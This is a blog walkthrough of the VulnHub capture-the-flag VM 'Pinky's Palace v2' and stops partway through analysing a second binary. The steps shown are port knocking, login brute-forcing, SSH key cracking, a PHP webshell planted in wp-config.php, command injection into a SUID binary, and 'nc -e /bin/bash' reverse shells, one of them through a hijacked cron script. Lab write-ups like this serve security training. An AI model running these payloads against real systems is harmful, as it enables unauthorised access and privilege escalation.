layout: post
title:  "Pinky's Palace siege"
subtitle: "inviting yourself to a party of pinky"
categories: [itsec,English,CTF,vulnhub]

![](https://i.imgur.com/jwTfV6K.png)

I want to write about [this VM](https://www.vulnhub.com/entry/pinkys-palace-v2,229/) because, for me, it was one of the best I ever resolved. Really nice way to make your way through it. Also it isn't that easy, containing flaws from false programmed programs you have to mention.
Let's start.

Note: You have to change your `/etc/hosts` file according VulnHub:

`echo 192.168.x.x pinkydb | sudo tee -a /etc/hosts`

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}

## Enumeration

First of all, let's see what we're facing at. We don't need to search the IP as of it's already given at the banner message. So I skip to port scan:

```shell
root@kali:~/vulnhub/pinkypalace# nmap -A -T5 -p- 10.20.20.133
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-20 11:15 CEST
Nmap scan report for pinkydb (10.20.20.133)
Host is up (0.00036s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
MAC Address: 00:0C:29:B1:F1:D8 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms pinkydb (10.20.20.133)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds
```

Only open port for now is `:80`. The other ones seem to be behind a firewall.

![img](https://i.imgur.com/2i60AfE.png)

Looks like Wordpress, let's scan it with `wpscan`.  There I didn't any really useful vuln.

The next thing I did for enumeration is searching for interesting files and directories. My preferred tool for that is `gobuster`.

```shell
root@kali:~/vulnhub/pinkypalace# gobuster -e -u http://pinkydb/ -x php,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 80

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://pinkydb/
[+] Threads      : 80
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .php,.txt
[+] Expanded     : true
=====================================================
http://pinkydb/wp-content (Status: 301)
http://pinkydb/index.php (Status: 301)
http://pinkydb/wp-login.php (Status: 200)
http://pinkydb/wordpress (Status: 301)
http://pinkydb/license.txt (Status: 200)
http://pinkydb/wp-includes (Status: 301)
http://pinkydb/wp-trackback.php (Status: 200)
http://pinkydb/secret (Status: 301)
http://pinkydb/wp-admin (Status: 301)
http://pinkydb/wp-signup.php (Status: 302)
=====================================================
```

The interesting part in that list is `http://pinkydb/secret`. Directory listing is enabled so we find a file named `bambam.txt` with the following content:

```
8890
7000
666

pinkydb
```

## First steps

Three numbers, that kinda looks like ports for a port knocking sequence. Trying it:

```shell
root@kali:~/vulnhub/pinkypalace# nmap -Pn --host-timeout 201 --max-retries 0  -p 7000,666,8890 pinkydb; sleep 20; nmap -sT -p- -r -n pinkydb --open | grep open
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-28 11:51 CEST
Nmap scan report for pinkydb (10.20.20.133)
Host is up (0.00032s latency).

PORT     STATE  SERVICE
666/tcp  closed doom
7000/tcp closed afs3-fileserver
8890/tcp closed ddi-tcp-3
MAC Address: 00:0C:29:B1:F1:D8 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
80/tcp    open  http
4655/tcp  open  unknown
7654/tcp  open  unknown
31337/tcp open  Elite
```

Let's look what we have listening on the newly open ports:

```shell
root@kali:~/vulnhub/pinkypalace# nmap -A -T5 -p 4655,7654,31337 --script vuln pinkydb
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-29 07:53 CEST
Nmap scan report for pinkydb (10.20.20.133)
Host is up (0.00052s latency).

PORT      STATE SERVICE VERSION
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
7654/tcp  open  http    nginx 1.10.3
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=pinkydb
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://pinkydb:7654/login.php
|     Form id: 
|_    Form action: 
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /login.php: Possible admin folder
|_http-server-header: nginx/1.10.3
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|   GetRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   HTTPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / HTTP/1.0
|   Help: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HELP
|   RTSPRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS / RTSP/1.0
|   SIPOptions: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.70%I=7%D=8/29%Time=5B8634D1%P=x86_64-pc-linux-gnu%r(N
SF:ULL,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20i
SF:s\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.
SF:\n=>\x20\0")%r(GetRequest,6B,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\
SF:x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\
SF:x20Pinky's\x20Palace\.\n=>\x20\0GET\x20/\x20HTTP/1\.0\r\n\r\n")%r(SIPOp
SF:tions,138,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x
SF:20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palac
SF:e\.\n=>\x20\0OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20n
SF:m;branch=foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>\r
SF:\nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\r\
SF:nContent-Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20applicat
SF:ion/sdp\r\n\r\n")%r(GenericLines,5D,"\[\+\]\x20Welcome\x20to\x20The\x20
SF:Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n
SF:\0into\x20Pinky's\x20Palace\.\n=>\x20\0\r\n\r\n")%r(HTTPOptions,6F,"\[\
SF:+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x
SF:20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0O
SF:PTIONS\x20/\x20HTTP/1\.0\r\n\r\n")%r(RTSPRequest,6F,"\[\+\]\x20Welcome\
SF:x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20o
SF:ur\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0OPTIONS\x20/\x20
SF:RTSP/1\.0\r\n\r\n")%r(RPCCheck,5A,"\[\+\]\x20Welcome\x20to\x20The\x20Da
SF:emon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0
SF:into\x20Pinky's\x20Palace\.\n=>\x20\0\x80")%r(DNSVersionBindReqTCP,59,"
SF:\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soo
SF:n\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20
SF:\0")%r(DNSStatusRequestTCP,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon
SF:\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into
SF:\x20Pinky's\x20Palace\.\n=>\x20\0")%r(Help,5F,"\[\+\]\x20Welcome\x20to\
SF:x20The\x20Daemon\x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20
SF:backdoor\n\0into\x20Pinky's\x20Palace\.\n=>\x20\0HELP\r\n");
MAC Address: 00:0C:29:B1:F1:D8 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms pinkydb (10.20.20.133)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.07 seconds
```

Yeah, I know. Many CLI copy paste. But I just want you to understand how my way was to beat that VM. Anyways. 
SSH is now open, we see also another HTTPd. And on 31337 an unkown service.

```shell
root@kali:~/vulnhub/pinkypalace# nc pinkydb 31337
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> help
help
```

Hmm :thinking:. Not sure what that is, so let's focus on the other services. The new HTTP service shows us a login page. I created a user list file, standard usernames and guessed ones:
(yes I tested also for SQLi, with no success. If you find a way to SQLi please message me :wink:)

```
root
admin
pinkydb
pinky
palace
```

Brute forcing with rockyou.txt and other wordlists with common passwords had no success. So I remembered my approach [from here](https://capsop.com/itsec/2016/07/24/Skydog-CTF.html#flag-4). There I created a custom wordlist out of a movie script. With `cewl` I created a wordlist based upon the Wordpress website from before. And BINGO! We have a successful hit!

```
root@kali:~/vulnhub/pinkypalace# patator http_fuzz url=http://pinkydb:7654/login.php method=POST 0=users.txt 1=wordlist.txt body="user=FILE0&pass=FILE1" -x ignore:fgrep='Invalid Username or Password!'
10:35:43 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2018-09-07 10:35 CEST
10:35:43 patator    INFO -                                                                              
10:35:43 patator    INFO - code size:clen       time | candidate                          |   num | mesg
10:35:43 patator    INFO - -----------------------------------------------------------------------------
10:35:43 patator    INFO - 302  752:-1         0.003 | pinky:Passione                     |   511 | HTTP/1.1 302 Found
10:35:44 patator    INFO - Hits/Done/Skip/Fail/Size: 1/830/0/0/830, Avg: 1550 r/s, Time: 0h 0m 0s
```

## Getting user

So, password is `Passione`.  After logging if we see a private RSA key and some notes. This looks like a SSH key to login. Let's try it on port 4655, where SSH listens. It has a password, so we have to brute force it first, for that I'm using that tool: [rsakey-cracker](https://github.com/quarantin/rsakey-cracker). As wordlist I use `rockyou.txt`. And we have it: `Passphrase is: secretz101`. 
For the future use I removed the password from the key. 

Inside the home folder is a executable named `qsub`, it has a SUID for the user *pinky* set. Only `pinky` or `www-data` are having permissions to it. As for now, we didn't find any way to get access as `pinky`. So let's focus on `www-data`.

With `find / -user www-data -perm -o+w 2>&1 | grep -v "Permission denied"` we search for all world writeable files owned by user `www-data`. And, surprise, `/var/www/html/apache/wp-config.php` is writeable. I placed a tiny webshell there: `<?php if(isset($_GET['c'])) echo "<pre>"; system($_GET['c']); echo "</pre>"; ?>`. To retrieve the binary I entered that URL: `http://pinkydb/wp-config.php?c=xxd /home/stefano/tools/qsub`, this will show a hexadecimal notation of the ELF. Simply retrieve it via curl and revert it to a binary. Also nice to have a first peek at it.

## 1st binary

So we have the file. Let's look inside to find out what the password is and what the binary does.

```
root@kali:~/vulnhub/pinkypalace/qsub# rabin2 -I -M -z -i qsub
[Main]
vaddr=0x00000a97 paddr=0x00000a97
[Imports]
   1 0x00000850  GLOBAL    FUNC getenv
   2 0x00000000    WEAK  NOTYPE _ITM_deregisterTMCloneTable
   3 0x00000860  GLOBAL    FUNC puts
   4 0x00000870  GLOBAL    FUNC setresuid
   5 0x00000880  GLOBAL    FUNC strlen
   6 0x00000890  GLOBAL    FUNC setresgid
   7 0x000008a0  GLOBAL    FUNC system
   8 0x000008b0  GLOBAL    FUNC printf
   9 0x000008c0  GLOBAL    FUNC geteuid
  10 0x00000000  GLOBAL    FUNC __libc_start_main
  11 0x000008d0  GLOBAL    FUNC strcmp
  12 0x00000000    WEAK  NOTYPE __gmon_start__
  13 0x000008e0  GLOBAL    FUNC getegid
  14 0x000008f0  GLOBAL    FUNC asprintf
  15 0x00000000    WEAK  NOTYPE _Jv_RegisterClasses
  16 0x00000900  GLOBAL    FUNC __isoc99_scanf
  17 0x00000910  GLOBAL    FUNC exit
  18 0x00000000    WEAK  NOTYPE _ITM_registerTMCloneTable
  19 0x00000000    WEAK    FUNC __cxa_finalize
   2 0x00000000    WEAK  NOTYPE _ITM_deregisterTMCloneTable
  10 0x00000000  GLOBAL    FUNC __libc_start_main
  12 0x00000000    WEAK  NOTYPE __gmon_start__
  15 0x00000000    WEAK  NOTYPE _Jv_RegisterClasses
  18 0x00000000    WEAK  NOTYPE _ITM_registerTMCloneTable
  19 0x00000000    WEAK    FUNC __cxa_finalize
000 0x00000c58 0x00000c58  52  53 (.rodata) ascii /bin/echo %s >> /home/pinky/messages/stefano_msg.txt
001 0x00000c8d 0x00000c8d  13  14 (.rodata) ascii %s <Message>\n
002 0x00000c9b 0x00000c9b   4   5 (.rodata) ascii TERM
003 0x00000ca0 0x00000ca0  20  21 (.rodata) ascii [+] Input Password: 
004 0x00000cb8 0x00000cb8  20  21 (.rodata) ascii Bad hacker! Go away!
005 0x00000cd0 0x00000cd0  31  32 (.rodata) ascii [+] Welcome to Question Submit!
006 0x00000cf0 0x00000cf0  23  24 (.rodata) ascii [!] Incorrect Password!
arch     x86
binsz    11394
bintype  elf
bits     64
canary   false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      true
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```

Thankfully not stripped :grin:. We see where main() starts, imports, strings, information about the ELF. There are some interesting strings, to see how they are used I am doing a static analysis. Don't see this as full tutorial on how to reverse engineer, I will just describe details of the ELF. For static analysis I use [radare2](https://rada.re/r/), it's free and really powerful.

Here is main:

```assembly
            ;-- main:
┌ (fcn) sym.main 307
│   sym.main (int argc, char **argv, char **envp);
│           ; var char **local_60h @ rbp-0x60
│           ; var signed int local_54h @ rbp-0x54
│           ; var char *s1 @ rbp-0x50
│           ; var uid_t local_10h @ rbp-0x10
│           ; var int local_ch @ rbp-0xc
│           ; var char *s2 @ rbp-0x8
│           ; arg signed int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 (0x94d)
│           0x00000a97      55             push rbp
│           0x00000a98      4889e5         rbp = rsp
│           0x00000a9b      4883ec60       rsp -= 0x60                 ; '`'
│           0x00000a9f      897dac         dword [local_54h] = edi     ; argc
│           0x00000aa2      488975a0       qword [local_60h] = rsi     ; argv
│           0x00000aa6      837dac01       var = dword [local_54h] - 1 ; [0x1:4]=0x2464c45
│       ┌─< 0x00000aaa      7f25           if (var > 0) goto 0xad1
│       │   0x00000aac      488b45a0       rax = qword [local_60h]
│       │   0x00000ab0      488b00         rax = qword [rax]
│       │   0x00000ab3      4889c6         rsi = rax
│       │   0x00000ab6      488d3dd00100.  rdi = str.s__Message        ; 0xc8d ; "%s <Message>\n" ; const char *format
│       │   0x00000abd      b800000000     eax = 0
│       │   0x00000ac2      e8e9fdffff     sym.imp.printf ()           ; int printf(const char *format)
│       │   0x00000ac7      bf00000000     edi = 0                     ; int status
│       │   0x00000acc      e83ffeffff     sym.imp.exit ()             ; void exit(int status)
│       │   ; CODE XREF from sym.main (0xaaa)
│       └─> 0x00000ad1      488d3dc30100.  rdi = str.TERM              ; 0xc9b ; "TERM" ; const char *name
│           0x00000ad8      e873fdffff     sym.imp.getenv ()           ; char *getenv(const char *name)
│           0x00000add      488945f8       qword [s2] = rax
│           0x00000ae1      488d3db80100.  rdi = str.Input_Password:   ; 0xca0 ; "[+] Input Password: " ; const char *format
│           0x00000ae8      b800000000     eax = 0
│           0x00000aed      e8befdffff     sym.imp.printf ()           ; int printf(const char *format)
│           0x00000af2      488d45b0       rax = [s1]
│           0x00000af6      4889c6         rsi = rax
│           0x00000af9      488d3db50100.  rdi = [0x00000cb5]          ; "%s" ; const char *format
│           0x00000b00      b800000000     eax = 0
│           0x00000b05      e8f6fdffff     sym.imp.__isoc99_scanf ()   ; int scanf(const char *format)
│           0x00000b0a      488d45b0       rax = [s1]
│           0x00000b0e      4889c7         rdi = rax                   ; const char *s
│           0x00000b11      e86afdffff     sym.imp.strlen ()           ; size_t strlen(const char *s)
│           0x00000b16      4883f828       var = rax - 0x28            ; '('
│       ┌─< 0x00000b1a      7616           if (((unsigned) var) <= 0) goto 0xb32
│       │   0x00000b1c      488d3d950100.  rdi = str.Bad_hacker__Go_away ; 0xcb8 ; "Bad hacker! Go away!" ; const char *s
│       │   0x00000b23      e838fdffff     sym.imp.puts ()             ; int puts(const char *s)
│       │   0x00000b28      bf00000000     edi = 0                     ; int status
│       │   0x00000b2d      e8defdffff     sym.imp.exit ()             ; void exit(int status)
│       │   ; CODE XREF from sym.main (0xb1a)
│       └─> 0x00000b32      488b55f8       rdx = qword [s2]
│           0x00000b36      488d45b0       rax = [s1]
│           0x00000b3a      4889d6         rsi = rdx                   ; const char *s2
│           0x00000b3d      4889c7         rdi = rax                   ; const char *s1
│           0x00000b40      e88bfdffff     sym.imp.strcmp ()           ; int strcmp(const char *s1, const char *s2)
│           0x00000b45      85c0           var = eax & eax
│       ┌─< 0x00000b47      7513           if (var) goto 0xb5c
│       │   0x00000b49      488d3d800100.  rdi = str.Welcome_to_Question_Submit ; 0xcd0 ; "[+] Welcome to Question Submit!" ; const char *format
│       │   0x00000b50      b800000000     eax = 0
│       │   0x00000b55      e856fdffff     sym.imp.printf ()           ; int printf(const char *format)
│      ┌──< 0x00000b5a      eb16           goto 0xb72
│      ││   ; CODE XREF from sym.main (0xb47)
│      │└─> 0x00000b5c      488d3d8d0100.  rdi = str.Incorrect_Password ; 0xcf0 ; "[!] Incorrect Password!" ; const char *s
│      │    0x00000b63      e8f8fcffff     sym.imp.puts ()             ; int puts(const char *s)
│      │    0x00000b68      bf00000000     edi = 0                     ; int status
│      │    0x00000b6d      e89efdffff     sym.imp.exit ()             ; void exit(int status)
│      │    ; CODE XREF from sym.main (0xb5a)
│      └──> 0x00000b72      e869fdffff     sym.imp.getegid ()
│           0x00000b77      8945f4         dword [local_ch] = eax
│           0x00000b7a      e841fdffff     sym.imp.geteuid ()          ; uid_t geteuid(void)
│           0x00000b7f      8945f0         dword [local_10h] = eax
│           0x00000b82      8b55f4         edx = dword [local_ch]
│           0x00000b85      8b4df4         ecx = dword [local_ch]
│           0x00000b88      8b45f4         eax = dword [local_ch]
│           0x00000b8b      89ce           esi = ecx
│           0x00000b8d      89c7           edi = eax
│           0x00000b8f      b800000000     eax = 0
│           0x00000b94      e8f7fcffff     sym.imp.setresgid ()
│           0x00000b99      8b55f0         edx = dword [local_10h]
│           0x00000b9c      8b4df0         ecx = dword [local_10h]
│           0x00000b9f      8b45f0         eax = dword [local_10h]
│           0x00000ba2      89ce           esi = ecx
│           0x00000ba4      89c7           edi = eax
│           0x00000ba6      b800000000     eax = 0
│           0x00000bab      e8c0fcffff     sym.imp.setresuid ()
│           0x00000bb0      488b45a0       rax = qword [local_60h]
│           0x00000bb4      4883c008       rax += 8
│           0x00000bb8      488b00         rax = qword [rax]
│           0x00000bbb      4889c7         rdi = rax
│           0x00000bbe      e89dfeffff     sym.send ()
│           0x00000bc3      b800000000     eax = 0
│           0x00000bc8      c9               
└           0x00000bc9      c3             return 0
```

And here a flow chart:

![](https://i.imgur.com/bErog47.png)

So what it does?

First it checks if arguments are given, if not, a usage help is printed and the program exists. Otherwise it asks for a password then. Let's see what the password is.

```
0x00000ad1      488d3dc30100.  rdi = str.TERM              ; 0xc9b ; "TERM" ; const char *name
0x00000ad8      e873fdffff     sym.imp.getenv ()           ; char *getenv(const char *name)
0x00000add      488945f8       qword [s2] = rax
0x00000ae1      488d3db80100.  rdi = str.Input_Password:   ; 0xca0 ; "[+] Input Password: " ; const char *format
0x00000ae8      b800000000     eax = 0
0x00000aed      e8befdffff     sym.imp.printf ()           ; int printf(const char *format)
0x00000af2      488d45b0       rax = [s1]
0x00000af6      4889c6         rsi = rax
0x00000af9      488d3db50100.  rdi = [0x00000cb5]          ; "%s" ; const char *format
0x00000b00      b800000000     eax = 0
0x00000b05      e8f6fdffff     sym.imp.__isoc99_scanf ()   ; int scanf(const char *format)
```

`s2` is set to the string from the environment variable `TERM`. `s1` is set to the password input.

```
    0x00000b11      e86afdffff     sym.imp.strlen ()           ; size_t strlen(const char *s)
    0x00000b16      4883f828       var = rax - 0x28            ; '('
┌─< 0x00000b1a      7616           if (((unsigned) var) <= 0) goto 0xb32
│   0x00000b1c      488d3d950100.  rdi = str.Bad_hacker__Go_away ; 0xcb8 ; "Bad hacker! Go away!" ; const char *s
│   0x00000b23      e838fdffff     sym.imp.puts ()             ; int puts(const char *s)
│   0x00000b28      bf00000000     edi = 0                     ; int status
│   0x00000b2d      e8defdffff     sym.imp.exit ()             ; void exit(int status)
│   ; CODE XREF from sym.main (0xb1a)
└─> 0x00000b32      488b55f8       rdx = qword [s2]

```

Checking if the password string is bigger than 40 (0x28 is hexadecimal, decimal is 40) chars. If yes, exit. If no, continue.

```
│       └─> 0x00000b32      488b55f8       rdx = qword [s2]
│           0x00000b36      488d45b0       rax = [s1]
│           0x00000b3a      4889d6         rsi = rdx                   ; const char *s2
│           0x00000b3d      4889c7         rdi = rax                   ; const char *s1
│           0x00000b40      e88bfdffff     sym.imp.strcmp ()           ; int strcmp(const char *s1, const char *s2)
│           0x00000b45      85c0           var = eax & eax
│       ┌─< 0x00000b47      7513           if (var) goto 0xb5c
│       │   0x00000b49      488d3d800100.  rdi = str.Welcome_to_Question_Submit ; 0xcd0 ; "[+] Welcome to Question Submit!" ; const char *format
│       │   0x00000b50      b800000000     eax = 0
│       │   0x00000b55      e856fdffff     sym.imp.printf ()           ; int printf(const char *format)
│      ┌──< 0x00000b5a      eb16           goto 0xb72
│      ││   ; CODE XREF from sym.main (0xb47)
│      │└─> 0x00000b5c      488d3d8d0100.  rdi = str.Incorrect_Password ; 0xcf0 ; "[!] Incorrect Password!" ; const char *s
│      │    0x00000b63      e8f8fcffff     sym.imp.puts ()             ; int puts(const char *s)
│      │    0x00000b68      bf00000000     edi = 0                     ; int status
│      │    0x00000b6d      e89efdffff     sym.imp.exit ()             ; void exit(int status)
```

Here it compares `s1` with `s2`. So when the given password is the `$TERM` string it continues. Otherwise an error is prompted and the program exists.

I will skip the `uid` and `gid` part as it just sets the group and user id for the file which will be created then (spoiler eh? :stuck_out_tongue_winking_eye:).

It calls the function `sym.send` then. 

```
┌ (fcn) sym.send 55
│   sym.send (int arg1);
│           ; var int local_18h @ rbp-0x18
│           ; var char *string @ rbp-0x8
│           ; arg int arg1 @ rdi
│           ; CALL XREF from sym.main (0xbbe)
│           0x00000a60      55             push rbp
│           0x00000a61      4889e5         rbp = rsp
│           0x00000a64      4883ec20       rsp -= 0x20
│           0x00000a68      48897de8       qword [local_18h] = rdi     ; arg1
│           0x00000a6c      488b55e8       rdx = qword [local_18h]
│           0x00000a70      488d45f8       rax = [string]
│           0x00000a74      488d35dd0100.  rsi = str.bin_echo__s_____home_pinky_messages_stefano_msg.txt ; 0xc58 ; "/bin/echo %s >> /home/pinky/messages/stefano_msg.txt"
│           0x00000a7b      4889c7         rdi = rax
│           0x00000a7e      b800000000     eax = 0
│           0x00000a83      e868feffff     sym.imp.asprintf ()
│           0x00000a88      488b45f8       rax = qword [string]
│           0x00000a8c      4889c7         rdi = rax                   ; const char *string
│           0x00000a8f      e80cfeffff     sym.imp.system ()           ; int system(const char *string)
│           0x00000a94      90             
│           0x00000a95      c9             leave 
└           0x00000a96      c3             return
```

It takes the argument which we used to call the program and put's it in another string: `/bin/echo %s >> /home/pinky/messages/stefano_msg.txt`. This string will be used as system command (`sym.imp.system`). There is no buffer overflow as it uses `asprintf` which dynamically associates the buffer based on the string length.

But! We can break it. How? Well, as you see it puts a system command based on a string. There is no security check, like forbidden chars or anything. Based on that we can simply use a command chain with `;`. Let's see if that works:

```
stefano@Pinkys-Palace:~/tools$ echo $TERM
xterm-256color
stefano@Pinkys-Palace:~/tools$ ./qsub ";touch /tmp/h4x"
[+] Input Password: xterm-256color

[+] Welcome to Question Submit!
stefano@Pinkys-Palace:~/tools$ ls -al /tmp/h4x
-rw-r--r-- 1 pinky stefano 0 Sep  7 16:27 /tmp/h4x
```

That worked! As we also see, the file has owner info UID pinky and GID stefano (that's the skipped part from above). As SUID is set it runs always as pinky. Time for a reverse shell!

## Access as pinky

Good for us `nc` has the `-e` option on that machine, that makes it a bit easier. A simple reverse shell can be spawned via `qsub` in that way: `./qsub ";nc -e /bin/bash 10.20.20.135 4444"`. And voila, we have a connection.

We are having access as pinky now. After some enumeration I mentioned that this user has write permissions to the file `/usr/local/bin/backup.sh`. The problem is that the group is wrong and we cannot really access it. This occurs because of the file we use to gain a reverse shell. A workaround is to gain directly access via SSH as pinky. Checking first if pinky is allowed to login: `stefano:x:1002:1002::/home/stefano:/bin/bash`. Yes, he is. Then we just place a public key of a SSH key and login with that key.

Now we have access to backup.sh!

```
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
#
#
#
```

Looks like it is used by a cronjob. Let's put there also a reverse shell inside with nc (I know you know how). After that, just wait.

## Access as demon

A connection will pop up. We have access as demon now. Searching for files owned by the user I found `/daemon/panel`. `file` stated that it's an ELF, non stripped. I copied it to my box via scp using pinky's user account (copied the binary to `/tmp`).

### 2nd binary

Let's gain some infos: 

```
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400840
  Start of program headers:          64 (bytes into file)
  Start of section headers:          11360 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         30
  Section header string table index: 29

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       000000000000001c  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002b8  000002b8
       00000000000001c8  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           0000000000400480  00000480
       000000000000009e  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040051e  0000051e
       0000000000000026  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400548  00000548
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400568  00000568
       0000000000000030  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             0000000000400598  00000598
       0000000000000180  0000000000000018  AI       5    23     8
  [11] .init             PROGBITS         0000000000400718  00000718
       0000000000000017  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         0000000000400730  00000730
       0000000000000110  0000000000000010  AX       0     0     16
  [13] .text             PROGBITS         0000000000400840  00000840
       00000000000003c2  0000000000000000  AX       0     0     16
  [14] .fini             PROGBITS         0000000000400c04  00000c04
       0000000000000009  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         0000000000400c10  00000c10
       00000000000000c2  0000000000000000   A       0     0     8
  [16] .eh_frame_hdr     PROGBITS         0000000000400cd4  00000cd4
       0000000000000044  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         0000000000400d18  00000d18
       0000000000000134  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       0000000000601e08  00001e08
       0000000000000008  0000000000000008  WA       0     0     8
